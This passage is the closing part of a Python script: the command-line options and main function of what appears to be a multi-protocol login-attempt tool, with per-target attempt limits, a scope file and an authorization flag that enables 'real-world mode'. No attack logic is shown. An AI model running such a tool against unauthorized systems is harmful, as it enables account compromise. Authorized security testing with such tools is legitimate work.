                   default=DEFAULT_MAX_ATTEMPTS_PER_TARGET)
    p.add_argument("--max-attempts-global", type=int,
                   default=DEFAULT_MAX_ATTEMPTS_GLOBAL)
    p.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    p.add_argument("--continue-after-hit", action="store_true")
    p.add_argument("--resume", action="store_true")
    p.add_argument("--dry-run", action="store_true")
    p.add_argument("--campaign")
    p.add_argument("--webhook")
    p.add_argument("--ja3", action="store_true")
    p.add_argument("--log-attempts", action="store_true", default=True)
    p.add_argument("--no-log-attempts", dest="log_attempts",
                   action="store_false")
    p.add_argument("-q", "--quiet", action="store_true")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--logfile")
    p.add_argument("--state", default="state.db")
    p.add_argument("--report")
    p.add_argument("--report-json")
    p.add_argument("--report-csv")
    p.add_argument("--list-protocols", action="store_true")
    p.add_argument("--i-have-authorization", action="store_true",
                   default=False,
                   help="Confirm you are authorized. Enables REAL-WORLD mode.")
    return p


def main():
    parser = build_parser()
    args = parser.parse_args()

    if args.list_protocols:
        print()
        rows = []
        for name in sorted(PROTOCOLS.keys()):
            p = PROTOCOLS[name]
            status = (f"{C.RED}MISSING{C.RESET} → {MISSING_DEPS[name]}"
                      if name in MISSING_DEPS
                      else f"{C.LIME}ready{C.RESET}")
            rows.append(f"{C.CYAN}{name:<14}{C.RESET}"
                        f"{C.GREY}:{p.default_port:<6}{C.RESET}  {status}")
        print(panel("PROTOCOLS", rows, accent=C.NEON))
        print()
        sys.exit(0)

    if not args.scope:
        print("error: --scope is required", file=sys.stderr)
        sys.exit(2)
    ensure_scope_file(Path(args.scope))

    setup_logging(verbose=args.verbose, quiet=args.quiet,
                  logfile=args.logfile)
    try:
        rc = asyncio.run(async_main(args))
    except PermissionError as e:
        log.error("%s", e)
        rc = 2
    except KeyboardInterrupt:
        rc = 130
    except Exception as e:
        log.error("unexpected error: %s", e)
        if os.environ.get("NEXOVAR_DEBUG"):
            import traceback
            traceback.print_exc()
        rc = 1
    sys.exit(rc)


if __name__ == "__main__":
    main()
